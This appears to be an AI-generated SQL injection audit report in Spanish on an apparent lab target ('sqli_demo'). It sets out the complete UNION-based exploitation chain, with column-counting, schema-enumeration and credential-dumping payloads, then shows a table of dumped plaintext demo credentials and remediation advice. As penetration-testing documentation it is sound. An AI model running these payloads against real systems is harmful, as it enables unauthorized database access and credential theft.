# Informe de Auditoría SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-21T07:47:56Z  
**Analista:** GitHub Copilot (claude-sonnet-4.6)  
**Tipo de análisis:** SQL Injection — Simple  

---

## Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad **SQL Injection clásica (error-based / UNION-based)** en el parámetro `id` de la aplicación web objetivo. La explotación permitió extraer información sensible de la base de datos, incluyendo credenciales de 8 usuarios.

---

## Reconocimiento

La página principal (`/`) expone un formulario con un campo `User ID` que realiza una petición GET:

```
GET /?id=<valor>&Submit=Submit
```

La respuesta muestra `First name` y `Surname` del usuario consultado, lo que indica que la consulta SQL devuelve al menos 2 columnas visibles.

---

## Vulnerabilidad Detectada

### SQL Injection — UNION-based (Error-based)

**Parámetro vulnerable:** `id` (GET)  
**Severidad:** 🔴 Crítica  
**CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command  

**Prueba de concepto (detección):**

```
GET /?id=1'&Submit=Submit
```

**Respuesta del servidor:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right 
syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```

El servidor devuelve el error SQL completo, confirmando inyección sin sanitización ni manejo de errores.

---

## Explotación

### 1. Determinación del número de columnas

```
GET /?id=1' ORDER BY 2-- -   → Respuesta válida (2 columnas)
GET /?id=1' ORDER BY 3-- -   → Sin resultados (confirma 2 columnas)
```

### 2. Identificación de columnas visibles

```
GET /?id=-1' UNION SELECT 'a','b'-- -
```
Resultado: `First name: a | Surname: b` → Ambas columnas son visibles.

### 3. Enumeración de la base de datos

| Campo | Valor |
|-------|-------|
| Versión del SGBD | `10.11.14-MariaDB-ubu2204` |
| Usuario DB | `root@172.18.0.3` |
| Base de datos activa | `sqli_demo` |
| Bases de datos disponibles | `information_schema, sqli_demo, sys, mysql, performance_schema` |

```sql
-- Payload utilizado:
-1' UNION SELECT version(),user()-- -
-1' UNION SELECT database(),2-- -
-1' UNION SELECT GROUP_CONCAT(schema_name),2 FROM information_schema.schemata-- -
```

### 4. Enumeración de tablas y columnas

**Tabla encontrada:** `users`  
**Columnas:** `user_id, first_name, last_name, username, password, email`

```sql
-1' UNION SELECT GROUP_CONCAT(table_name),2 
FROM information_schema.tables WHERE table_schema='sqli_demo'-- -

-1' UNION SELECT GROUP_CONCAT(column_name),2 
FROM information_schema.columns 
WHERE table_schema='sqli_demo' AND table_name='users'-- -
```

### 5. Extracción de credenciales

```sql
-1' UNION SELECT GROUP_CONCAT(user_id,':',username,':',password,':',email SEPARATOR '|'),2 
FROM sqli_demo.users-- -
```

**Datos extraídos:**

| user_id | username | password | email |
|---------|----------|----------|-------|
| 1 | admin | password123 | admin@example.com |
| 2 | jsmith | secret456 | jane@example.com |
| 3 | bjohnson | mypass789 | bob@example.com |
| 4 | awilliams | qwerty123 | alice@example.com |
| 5 | cbrown | password | charlie@example.com |
| 6 | ddavis | secure123 | diana@example.com |
| 7 | emiller | hackme | eve@example.com |
| 8 | fwilson | admin123 | frank@example.com |

> ⚠️ Las contraseñas se almacenan en **texto plano** (sin hash), lo que agrava severamente el impacto.

---

## Impacto

- **Confidencialidad:** Extracción completa de credenciales de usuarios.
- **Integridad:** El usuario de BD es `root`, lo que permitiría INSERT/UPDATE/DELETE en cualquier tabla.
- **Disponibilidad:** Posible DROP de tablas o bases de datos completas.
- **Escalada:** Credenciales en texto plano expuestas; reutilización de contraseñas potencialmente explotable.

---

## Recomendaciones

1. **Usar consultas preparadas (Prepared Statements)** con parámetros enlazados:
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   ```
2. **Validar y sanitizar entradas:** Rechazar caracteres especiales (`'`, `"`, `;`, `--`, etc.) o usar listas blancas.
3. **Deshabilitar mensajes de error SQL** en producción (`display_errors = Off`).
4. **Principio de mínimo privilegio:** La aplicación no debería conectarse con el usuario `root`; usar un usuario con solo permisos `SELECT` sobre las tablas necesarias.
5. **Hashear contraseñas** con algoritmos seguros (bcrypt, Argon2) — nunca almacenar en texto plano.
6. **Implementar WAF** para detectar y bloquear patrones de inyección conocidos.

---

## Conclusión

La aplicación presenta una vulnerabilidad SQL Injection crítica que permite a un atacante no autenticado extraer toda la información de la base de datos. La combinación de inyección sin filtrar, errores expuestos, usuario `root` en BD y contraseñas en texto plano representa un riesgo extremo que debe ser remediado de forma inmediata.

---

*Informe generado automáticamente por análisis de seguridad — uso autorizado*
